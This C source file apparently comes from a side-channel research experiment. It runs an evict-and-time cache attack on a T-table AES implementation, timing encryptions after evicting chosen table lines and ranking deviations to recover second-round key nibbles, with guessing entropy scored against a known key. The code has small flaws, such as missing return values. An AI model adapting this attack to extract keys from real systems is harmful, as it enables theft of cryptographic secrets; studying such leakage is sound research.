///// EVICTING code
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>

#include <aes.h>

#include "params.h"

// I think iterations is the number of encryptions.
#define ITERATIONS (1 << 21)              /* The maximum iterations for making the statistics */

#define EXP_GE 5  /*For round 2 attack expected GE*/

static const unsigned int Te0[256] __attribute__((aligned(0x1000)))= {
    0xc66363a5U, 0xf87c7c84U, 0xee777799U, 0xf67b7b8dU,
    0xfff2f20dU, 0xd66b6bbdU, 0xde6f6fb1U, 0x91c5c554U,
    0x60303050U, 0x02010103U, 0xce6767a9U, 0x562b2b7dU,
    0xe7fefe19U, 0xb5d7d762U, 0x4dababe6U, 0xec76769aU,
    0x8fcaca45U, 0x1f82829dU, 0x89c9c940U, 0xfa7d7d87U,
    0xeffafa15U, 0xb25959ebU, 0x8e4747c9U, 0xfbf0f00bU,
    0x41adadecU, 0xb3d4d467U, 0x5fa2a2fdU, 0x45afafeaU,
    0x239c9cbfU, 0x53a4a4f7U, 0xe4727296U, 0x9bc0c05bU,
    0x75b7b7c2U, 0xe1fdfd1cU, 0x3d9393aeU, 0x4c26266aU,
    0x6c36365aU, 0x7e3f3f41U, 0xf5f7f702U, 0x83cccc4fU,
    0x6834345cU, 0x51a5a5f4U, 0xd1e5e534U, 0xf9f1f108U,
    0xe2717193U, 0xabd8d873U, 0x62313153U, 0x2a15153fU,
    0x0804040cU, 0x95c7c752U, 0x46232365U, 0x9dc3c35eU,
    0x30181828U, 0x379696a1U, 0x0a05050fU, 0x2f9a9ab5U,
    0x0e070709U, 0x24121236U, 0x1b80809bU, 0xdfe2e23dU,
    0xcdebeb26U, 0x4e272769U, 0x7fb2b2cdU, 0xea75759fU,
    0x1209091bU, 0x1d83839eU, 0x582c2c74U, 0x341a1a2eU,
    0x361b1b2dU, 0xdc6e6eb2U, 0xb45a5aeeU, 0x5ba0a0fbU,
    0xa45252f6U, 0x763b3b4dU, 0xb7d6d661U, 0x7db3b3ceU,
    0x5229297bU, 0xdde3e33eU, 0x5e2f2f71U, 0x13848497U,
    0xa65353f5U, 0xb9d1d168U, 0x00000000U, 0xc1eded2cU,
    0x40202060U, 0xe3fcfc1fU, 0x79b1b1c8U, 0xb65b5bedU,
    0xd46a6abeU, 0x8dcbcb46U, 0x67bebed9U, 0x7239394bU,
    0x944a4adeU, 0x984c4cd4U, 0xb05858e8U, 0x85cfcf4aU,
    0xbbd0d06bU, 0xc5efef2aU, 0x4faaaae5U, 0xedfbfb16U,
    0x864343c5U, 0x9a4d4dd7U, 0x66333355U, 0x11858594U,
    0x8a4545cfU, 0xe9f9f910U, 0x04020206U, 0xfe7f7f81U,
    0xa05050f0U, 0x783c3c44U, 0x259f9fbaU, 0x4ba8a8e3U,
    0xa25151f3U, 0x5da3a3feU, 0x804040c0U, 0x058f8f8aU,
    0x3f9292adU, 0x219d9dbcU, 0x70383848U, 0xf1f5f504U,
    0x63bcbcdfU, 0x77b6b6c1U, 0xafdada75U, 0x42212163U,
    0x20101030U, 0xe5ffff1aU, 0xfdf3f30eU, 0xbfd2d26dU,
    0x81cdcd4cU, 0x180c0c14U, 0x26131335U, 0xc3ecec2fU,
    0xbe5f5fe1U, 0x359797a2U, 0x884444ccU, 0x2e171739U,
    0x93c4c457U, 0x55a7a7f2U, 0xfc7e7e82U, 0x7a3d3d47U,
    0xc86464acU, 0xba5d5de7U, 0x3219192bU, 0xe6737395U,
    0xc06060a0U, 0x19818198U, 0x9e4f4fd1U, 0xa3dcdc7fU,
    0x44222266U, 0x542a2a7eU, 0x3b9090abU, 0x0b888883U,
    0x8c4646caU, 0xc7eeee29U, 0x6bb8b8d3U, 0x2814143cU,
    0xa7dede79U, 0xbc5e5ee2U, 0x160b0b1dU, 0xaddbdb76U,
    0xdbe0e03bU, 0x64323256U, 0x743a3a4eU, 0x140a0a1eU,
    0x924949dbU, 0x0c06060aU, 0x4824246cU, 0xb85c5ce4U,
    0x9fc2c25dU, 0xbdd3d36eU, 0x43acacefU, 0xc46262a6U,
    0x399191a8U, 0x319595a4U, 0xd3e4e437U, 0xf279798bU,
    0xd5e7e732U, 0x8bc8c843U, 0x6e373759U, 0xda6d6db7U,
    0x018d8d8cU, 0xb1d5d564U, 0x9c4e4ed2U, 0x49a9a9e0U,
    0xd86c6cb4U, 0xac5656faU, 0xf3f4f407U, 0xcfeaea25U,
    0xca6565afU, 0xf47a7a8eU, 0x47aeaee9U, 0x10080818U,
    0x6fbabad5U, 0xf0787888U, 0x4a25256fU, 0x5c2e2e72U,
    0x381c1c24U, 0x57a6a6f1U, 0x73b4b4c7U, 0x97c6c651U,
    0xcbe8e823U, 0xa1dddd7cU, 0xe874749cU, 0x3e1f1f21U,
    0x964b4bddU, 0x61bdbddcU, 0x0d8b8b86U, 0x0f8a8a85U,
    0xe0707090U, 0x7c3e3e42U, 0x71b5b5c4U, 0xcc6666aaU,
    0x904848d8U, 0x06030305U, 0xf7f6f601U, 0x1c0e0e12U,
    0xc26161a3U, 0x6a35355fU, 0xae5757f9U, 0x69b9b9d0U,
    0x17868691U, 0x99c1c158U, 0x3a1d1d27U, 0x279e9eb9U,
    0xd9e1e138U, 0xebf8f813U, 0x2b9898b3U, 0x22111133U,
    0xd26969bbU, 0xa9d9d970U, 0x078e8e89U, 0x339494a7U,
    0x2d9b9bb6U, 0x3c1e1e22U, 0x15878792U, 0xc9e9e920U,
    0x87cece49U, 0xaa5555ffU, 0x50282878U, 0xa5dfdf7aU,
    0x038c8c8fU, 0x59a1a1f8U, 0x09898980U, 0x1a0d0d17U,
    0x65bfbfdaU, 0xd7e6e631U, 0x844242c6U, 0xd06868b8U,
    0x824141c3U, 0x299999b0U, 0x5a2d2d77U, 0x1e0f0f11U,
    0x7bb0b0cbU, 0xa85454fcU, 0x6dbbbbd6U, 0x2c16163aU,
};

AES_KEY expanded;

#define TIME_THRESHOLD     8000    // for 4 tables of 1024 bytes

unsigned char pt[16];               /* Holds the Plaintext */
unsigned char ct[16];               /* Holds the ciphertext */

unsigned int ttime[16][16];         /* Holds the timing     */
unsigned int tcount[16][16];        /* Holds the count      */
double tavg[16][16];                /* ttime[x]/tcount[x]   */
double deviations[16][16];          /* Deviations from tavgavg */
double tavgavg;                     /* Average of all timings */

// Plotting data
unsigned int pttime[16][256];         /* Holds the timing     */
unsigned int ptcount[16][256];        /* Holds the count      */
double ptavg[16][256];                /* ttime[x]/tcount[x]   */
double pdeviations[16][256];          /* Deviations from tavgavg */

int t0, t1, t2, t3;

int correct_4bits[] = {0, 0, 3, 0, 6, 5, 6, 7, 10, 9, 10, 11, 12, 13, 14, 14};
int correctb_4bits[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0};

struct mypair {
	int idx;
	double deviation;
};

int cmp (const void *p1, const void *p2) {
	if ((*(struct mypair*)p1).deviation > (*(struct mypair*)p2).deviation) return 0;
	else return 1;
}

void printtime()
{
	int i, c;
	FILE *f;

	f = fopen("log", "w");
	for(c=4; c<16; ++c){
		fprintf(f, ".............%d.........\n", c);
		for(i=0; i<16; ++i){
			fprintf(f, "%d  %.3f  %.4f\n", i, tavg[c][i], deviations[c][i]);
		}
	}
	fclose(f);
}

unsigned int finddeviant(unsigned int c)
{
	int i, maxi;
	double ttimesum, tcountsum;
	double maxdeviation;

	/* Compute average timing for c */
	ttimesum = 0;
	tcountsum = 0;
	for(i=0; i<16; ++i){
		tavg[c][i] = ttime[c][i] / (float)tcount[c][i];	
		ttimesum += ttime[c][i];
		tcountsum += tcount[c][i];
	}	
	tavgavg = ttimesum/tcountsum;

	/* Compute deviations from the average time */
	for(i=0; i<16; ++i){
		deviations[c][i] = fabs(tavg[c][i] - tavgavg);
	}	

	/* Find the maximum deviation, this is the possible leakage */
	maxdeviation = deviations[c][0];
	maxi = 0;
	for(i=1; i<16; ++i){
		if(maxdeviation < deviations[c][i]){
			maxdeviation = deviations[c][i];
			maxi = i;
		}
	}

	return maxi;
}

int findGE(int bytenum, int round, int*pt) {
	int guess_entropy = 0;
    int c = bytenum;
    struct mypair mat[16];
    for (int i = 0; i < 16; ++i) {
        mat[i].idx = i;
        mat[i].deviation = deviations[c][i];
    }
    qsort((void*)mat, 16, sizeof(mat[0]), cmp);
    // for (int i = 0; i < 16; ++i) printf("%d %.4f\n", mat[i].idx, mat[i].deviation);
	
    for (int i = 0; i < 16; ++i) {
		if (i < EXP_GE) pt[i] = mat[i].idx;

		if (round == 1) {
			if (mat[i].idx == correct_4bits[c]) {
				guess_entropy += (i + 1);
			}

		}
		else {
			if (mat[i].idx == correctb_4bits[c]) {
				guess_entropy += (i + 1);
			}
		}
	}
	return guess_entropy;
}

void findkeys(int bytenum, int round, int*pt)
{
    // printf("%02d(%x) ", bytenum, finddeviant(bytenum));	
	int temp = finddeviant(bytenum);
	int ge_value = findGE(bytenum, round, pt);
	//printf("%d", ge_value);
	// fprintf(fpr, "%d,", ge_value);
	// printf("\n");
	// return temp;
}

void set_PT(int set) {
    for(int i=0; i<16; i++) {
        pt[i] = (correct_4bits[i] ^ set) << 4;

		//To make it easier to backtrack
		if (i!=0)
			pt[i] = pt[i] | correctb_4bits[i];

    }
}

double attackrnd2_32bits()
{
	int i;
	unsigned int start, end, timing;

	FILE *f;
	f = fopen("log2", "w");

	//Table0 - PT[0, 5, 10, 15]
	//Table1 - 4, 9, 14, 3
	//Table2 - 8, 13, 2, 7
	//Table3 - 12, 1, 6, 11

	for (int tablenum = 0; tablenum < 1; tablenum++) {
		for (int bytenum = 0; bytenum < 1; bytenum++) {
			for (int l=0; l<16; l++) {
				ttime[bytenum][l] = 0; 
				tcount[bytenum][l] = 0;
			}

			fprintf(f, "\n\n*******Attacking byte-%d with Table-%d for Rnd2*******\n", bytenum, tablenum);
			printf("Byte-%d\n", bytenum);

			int ii=0, idx=0;
			int target_idx1 = 4;

			int pt1[EXP_GE], pt2[EXP_GE];

			set_PT(idx); // Ensures that the first round table access is only to cache set idx
			
			while(ii++ <= (ITERATIONS)){
				if (idx==target_idx1) target_idx1 = (target_idx1+1) & 0x0f; // In case of overflow

				// For each key byte we target the particular key. To increase number of cases bytes which don't affect the Te0 of round 2 are updated.
				pt[0] = (pt[0] & 0xf0) | (random() & 0x0f);
				for (int pos = 0; pos<16; pos++)
					if ((pos!=5) && (pos!=10) && (pos!=15))
						pt[pos] = (pt[pos] & 0xf0) | (random() & 0x0f);
				// pt[5] = pt[5] | (random() & 0x0f);
				// pt[10] = pt[10] | (random() & 0x0f);
				// pt[15] = pt[15] | (random() & 0x0f);

				// Begin one encryption to put data into cache
				AES_encrypt(pt, ct, &expanded);
				asm volatile("mfence");

				// asm volatile("clflush (%0)" :: "r" (Te0+idx));
				clean_cache_table_idx(target_idx1, tablenum);
				
				// In this encr, if data got removed then it will take more time
				start = timestamp();
				asm volatile("mfence");
				AES_encrypt(pt, ct, &expanded);
				asm volatile("mfence");
				end = timestamp();

				timing = end - start;

				if(timing < TIME_THRESHOLD){    		// Removing outliers due to context switch  
					/* Record the timings */
					// idx = pt[0] ^ kg[0]
					ttime[bytenum][(pt[0] & 0x0f)] += timing; 
					tcount[bytenum][(pt[0] & 0x0f)] += 1;	
				}

				/* print if its time */
				// if (!(ii & (ii - 1))) {
				if (ii == ITERATIONS) {
					findkeys(bytenum, 2, pt1); //pt1 is being used to store multiple deviating values
				}

				if (ii == ITERATIONS) {
					for(int i=0; i<16; ++i) {
						fprintf(f, "%d  %.3f  %.4f\n", i, tavg[bytenum][i], deviations[bytenum][i]);
					}
				}
			}

			for (int l=0; l<16; l++) {
				ttime[bytenum][l] = 0; 
				tcount[bytenum][l] = 0;
				deviations[bytenum][l] = 0;
			}

			ii = 0;
			int target_idx2 = 6;

			while(ii++ <= (ITERATIONS)){
				if (idx==target_idx2) target_idx2 = (target_idx2+1) & 0x0f; // In case of overflow
				
				pt[0] = (pt[0] & 0xf0) | (random() & 0x0f);
				for (int pos = 0; pos<16; pos++)
					if ((pos!=5) && (pos!=10) && (pos!=15))
						pt[pos] = (pt[pos] & 0xf0) | (random() & 0x0f);
				// Do not change other bits above
				// pt[5] = pt[5] | (random() & 0x0f);
				// pt[10] = pt[10] | (random() & 0x0f);
				// pt[15] = pt[15] | (random() & 0x0f);

				// Begin one encryption to put data into cache
				AES_encrypt(pt, ct, &expanded);
				asm volatile("mfence");

				// asm volatile("clflush (%0)" :: "r" (Te0+idx));
				clean_cache_table_idx(target_idx2, tablenum);
				
				// In this encr, if data got removed then it will take more time
				start = timestamp();
				asm volatile("mfence");
				AES_encrypt(pt, ct, &expanded);
				asm volatile("mfence");
				end = timestamp();

				timing = end - start;

				if(timing < TIME_THRESHOLD){    		// Removing outliers due to context switch  
					/* Record the timings */
					// idx = pt[0] ^ kg[0]
					ttime[bytenum][(pt[0] & 0x0f)] += timing; 
					tcount[bytenum][(pt[0] & 0x0f)] += 1;	
				}

				/* print if its time */
				// if (!(ii & (ii - 1))) {
				if (ii == ITERATIONS) {
					// printf("%08x\t", ii);
					findkeys(bytenum, 2, pt2);
				}

				if (ii == ITERATIONS) {
					for(int i=0; i<16; ++i) {
						fprintf(f, "%d  %.3f  %.4f\n", i, tavg[bytenum][i], deviations[bytenum][i]);
					}
				}
			}

			int flag = 0;
			printf("best guessed values for plaintext %d, %d\n", pt1[0], pt2[0]);

			// Checking if the best guessed values are matching
			for(int sol=0; sol<16; sol++) {
				int kg = (correct_4bits[bytenum] << 4) | sol;
				int pt1g = (pt[0] & 0xf0) | pt1[0];
				int pt2g = (pt[0] & 0xf0) | pt2[0];
				unsigned int res = Te0[pt1g ^ kg] ^ Te0[pt2g ^ kg];

				if ((res >> 28) == (target_idx1 ^ target_idx2)) {
					printf("Best keyguess is %x\n", kg);
					flag = 1;
				}
			}

			// Checking if other top combinations work
			for(int sol=0; sol<16; sol++) {
				int kg = (correct_4bits[bytenum] << 4) | sol;
				int pt1g = (pt[0] & 0xf0) | pt1[1];
				int pt2g = (pt[0] & 0xf0) | pt2[0];
				unsigned int res = Te0[pt1g ^ kg] ^ Te0[pt2g ^ kg];

				if ((res >> 28) == (target_idx1 ^ target_idx2)) {
					printf("Alternative keyguess is %x\n", kg);
					flag = 2;
				}
			}

			for(int sol=0; sol<16; sol++) {
				int kg = (correct_4bits[bytenum] << 4) | sol;
				
				int pt1g = (pt[0] & 0xf0) | pt1[0];
				int pt2g = (pt[0] & 0xf0) | pt2[1];
				unsigned int res = Te0[pt1g ^ kg] ^ Te0[pt2g ^ kg];

				if ((res >> 28) == (target_idx1 ^ target_idx2)) {
					printf("Alternative keyguess is %x\n", kg);
					flag = 3;
				}
			}

			if (flag == 0) 
				printf("Key byte not found\n\n");
		}
	}
	fclose(f);
}


int findGE_4bits(int bytenum, int round) {
	int guess_entropy = 0;
    int c = bytenum;
    struct mypair mat[16];
    for (int i = 0; i < 16; ++i) {
        mat[i].idx = i;
        mat[i].deviation = deviations[c][i];
    }
    qsort((void*)mat, 16, sizeof(mat[0]), cmp);
    // for (int i = 0; i < 16; ++i) printf("%d %.4f\n", mat[i].idx, mat[i].deviation);
	
    for (int i = 0; i < 16; ++i) {
		if (round == 1) {
			if (mat[i].idx == correct_4bits[c]) {
				guess_entropy += (i + 1);
			}

		}
		else {
			if (mat[i].idx == correctb_4bits[c]) {
				guess_entropy += (i + 1);
			}
		}
	}
	return guess_entropy;
}

void findkeys_4bits(int bytenum, int round)
{
    // printf("%02d(%x) ", bytenum, finddeviant(bytenum));	
	int temp = finddeviant(bytenum);
	int ge_value = findGE_4bits(bytenum, round);
	printf("%d", ge_value);
	// fprintf(fpr, "%d,", ge_value);
	// printf("\n");
	// return temp;
}

double attackrnd2_4bits()
{
	int i;
	unsigned int start, end, timing;
    // i = 0 -> 1st byte
    // j = 0 -> Te0 T-table

	FILE *f;
	f = fopen("log2", "w");

	//Table0 - PT[0, 5, 10, 15]
	//Table1 - 4, 9, 14, 3
	//Table2 - 8, 13, 2, 7
	//Table3 - 12, 1, 6, 11
			
	int target_idx = 1, idx = 0;
	for(int bytenum = 0; bytenum < 16; bytenum++) {
		printf("\nByte-%d\n", bytenum);
		for(target_idx = 0; target_idx!=idx, target_idx<16; target_idx++) {
			for (int l=0; l<16; l++) {
				ttime[bytenum][l] = 0; 
				tcount[bytenum][l] = 0;
			}
			printf("Target is %d\n", target_idx);

			for(int tablenum = 0; tablenum < 4; tablenum++) {
				fprintf(f, "\n\n*******Attacking byte %d with table-%d for Rnd2 key*******\n", bytenum, tablenum);
				int ii=0;
				
				while(ii++ <= (ITERATIONS)){
					/* Set a plaintext */
					if (idx==target_idx) idx = (idx+1) & 0xff;
					set_PT(idx);

					// 	pt[bt] = pt[bt] | (random() & 0x0f);
					pt[bytenum] = pt[bytenum] | (ii & 0x0f); // or random initialisation - Here random isn't used as it was noticed that some values were not getting used

					// Begin one encryption to put data into cache
					AES_encrypt(pt, ct, &expanded);
					asm volatile("mfence");

					// asm volatile("clflush (%0)" :: "r" (Te0+idx));
					clean_cache_table_idx(target_idx, 0);		
					
					// In this encr, if data got removed then it will take more time
					start = timestamp();
					asm volatile("mfence");
					AES_encrypt(pt, ct, &expanded);
					asm volatile("mfence");
					end = timestamp();

					timing = end - start;

					if(timing < TIME_THRESHOLD){    		// Removing outliers due to context switch  
						/* Record the timings */
						// idx = pt[0] ^ kg[0]
						ttime[bytenum][(ii & 0x0f)] += timing; 
						tcount[bytenum][(ii & 0x0f)] += 1;	
					}

					/* print if its time */
					// if (!(ii & (ii - 1))) {
					if (ii == ITERATIONS) {
						printf("%08x\t", ii);
						findkeys_4bits(bytenum, 2);
					}

					if (ii == ITERATIONS) {
						for(int i=0; i<16; ++i) {
							fprintf(f, "%d  %.3f  %.4f\n", i, tavg[bytenum][i], deviations[bytenum][i]);
						}
					}
				}

				printf("\nIdentified for %d:%d\n", target_idx, finddeviant(bytenum));
			}
		}
	}
	int GE = 0;
	printf("\n\nRESULTS\n");
	for (int l=0; l<16; l++) {
		GE += findGE_4bits(l, 2);
		printf("%02d(%x) %d  ", l, finddeviant(l), findGE_4bits(l, 2));	
	}
	printf("\nNet GE=%d\n", GE);
	fclose(f);
}

void ReadKey(const unsigned char *filename)
{
	int i;
	FILE *f;
	unsigned int i_secretkey[16]; 
	unsigned char uc_secretkey[16]; 

	/* Read key from a file */
	if((f = fopen(filename, "r")) == NULL){
		printf("Cannot open key file\n");
		exit(-1);
	}
	for(i=0; i<16; ++i){
		fscanf(f, "%x", &i_secretkey[i]);
		uc_secretkey[i] = (unsigned char) i_secretkey[i];
	}
	fclose(f);
	AES_set_encrypt_key(uc_secretkey, 128, &expanded);
}

/* 
 * The main 
 */
int main(int argc, char **argv)
{
	srandom(timestamp());

	ReadKey("key");
	printf("Getting Second Round Key Relations\n");
	attackrnd2_4bits();
}

